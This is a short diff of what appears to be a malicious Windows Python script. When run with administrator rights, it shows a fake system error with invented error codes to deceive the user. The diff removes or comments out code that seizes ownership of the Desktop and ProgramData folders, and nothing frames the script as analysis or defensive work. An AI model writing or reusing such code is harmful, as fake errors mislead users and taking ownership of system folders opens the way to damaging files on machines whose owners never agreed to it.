@@ -21,28 +21,14 @@ if is_admin():
 
     ShowFuckNotification("ERR", "x039_SUBSYSTEM: Your system does not support this function. TABLE: 0x936B80000000000, TABLE: 0x536000000000, TABLE: 0x9bC0000000000, TABLE: 0x64180000000000, TABLE: 0x080000000000")
 
-    folder_ownership = getFolderOwner(getDesktopPath())
-    permissions = getOwnerShip(getDesktopPath())
-
-    folder_path = getDesktopPath()
-    result = SetOwnership(folder_path)
-    if result:
-        pass
-    else:
-        pass
-
-
     default_disk = os.environ['SYSTEMDRIVE']
-    def REMPROM():
-        defaultdiskpath = default_disk + "\\ProgramData\\"
-        permissions = getOwnerShip(defaultdiskpath)
-        folder_ownership = getFolderOwner(defaultdiskpath)
+    #def REMPROM():
+        #defaultdiskpath = default_disk + "\\ProgramData\\"
 
-        result = SetOwnership(defaultdiskpath)
-        if result:
-            pass
-        else:
-            pass
+        #if result:
+         #   pass
+        #else:
+         #   pass
 
     try:
         try:
